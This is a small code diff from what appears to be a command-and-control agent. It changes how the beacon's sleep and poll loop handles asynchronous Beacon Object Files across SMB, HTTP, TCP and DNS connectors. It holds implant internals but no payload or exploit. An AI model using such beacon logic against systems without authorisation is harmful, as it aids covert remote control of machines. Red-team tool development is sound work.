@@ -99,14 +99,10 @@ DWORD WINAPI AgentMain(LPVOID lpParam)
 				if (g_Agent->pivotter->pendingWrite)
 					pollIntervalMs = 10;
 
-				// Si hay BOFs asincronos activos, forzar un poll interval en el beacon SMB
-				// para que no quede bloqueado en WaitForMultipleObjects(INFINITE) mientras
-				// el BOF produce output. El wakeupEvent ya fue reseteado en el ciclo anterior,
-				// y el BOF en ejecucion puede no volver a senalizarlo hasta que tenga nuevo output.
-				// Con un intervalo de 50ms el output se entrega sin esperar al proximo comando.
-				if (pollIntervalMs == 0 && g_AsyncBofManager->asyncBofs.size() > 0)
-					pollIntervalMs = 50;
-
+				// The 50ms polling loop for async BOFs was removed: BofOutputToContext now
+				// calls SignalWakeup() every time the BOF produces output, which immediately
+				// unblocks ConnectorSMB (WaitForMultipleObjects) and WaitMaskWithEvent
+				// (HTTP/TCP/DNS) without ignoring the sleep_delay.
 				g_Connector->Sleep(g_AsyncBofManager->GetWakeupEvent(), g_Agent->GetWorkingSleep(), g_Agent->config->sleep_delay, g_Agent->config->jitter_delay, hasOutput, pollIntervalMs);
 			}
 
